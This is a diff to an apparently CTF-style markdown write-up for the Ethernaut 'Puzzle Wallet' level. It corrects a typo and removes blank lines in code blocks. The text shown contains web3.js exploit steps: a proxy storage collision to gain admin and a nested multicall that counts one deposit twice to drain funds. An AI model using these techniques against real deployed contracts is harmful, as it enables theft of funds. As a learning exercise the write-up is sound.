@@ -39,7 +39,7 @@ This function allows us to execute multiple functions in 1 transaction. Thus, we
 
 But we can bypass this protection if we **"pack"** one deposit inside another `multicall`
 
-## Let's sum up all the actions required together, we will only used web3 js commands :
+## Let's sum up all the actions required together, we will only use web3 js commands :
 
 ### 1. Claim ownership of `PuzzleWallet` contract by changing `pendingAdmin` value to the player's address
 
@@ -47,7 +47,6 @@ We first calculate the signature of the `proposeNewAdmin` function :
 
 ```
 web3.eth.abi.encodeFunctionSignature("proposeNewAdmin(address)");
-
 '0xa6376746'
 ```
 
@@ -55,7 +54,6 @@ Then the signature of the parameter `address` with player's address :
 
 ```
 web3.eth.abi.encodeParameter("address", player);
-
 '0x000000000000000000000000cabcdefghijkl123456123451234567123456789'
 ```
 
@@ -79,7 +77,6 @@ contract.addToWhitelist(player);
 
 ```
 deposit = web3.eth.abi.encodeFunctionSignature("deposit()");
-
 '0xd0e30db0'
 ```
 
@@ -87,7 +84,6 @@ deposit = web3.eth.abi.encodeFunctionSignature("deposit()");
 
 ```
 multicall = eb3.eth.abi.encodeFunctionSignature("multicall(bytes[])");
-
 '0xac9650d8'
 ```
 
@@ -95,7 +91,6 @@ Signature of the `deposit` call as a  `multicall` parameter :
 
 ```
 web3.eth.abi.encodeParameter('bytes[]', [deposit]);
-
 '0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000';
 ```
 
@@ -115,7 +110,6 @@ contract.multicall([deposit, packedDeposit], { value: toWei('0.001') });
 
 ```
 (await getBalance(instance)).toString();
-
 '0.002'
 ```
 
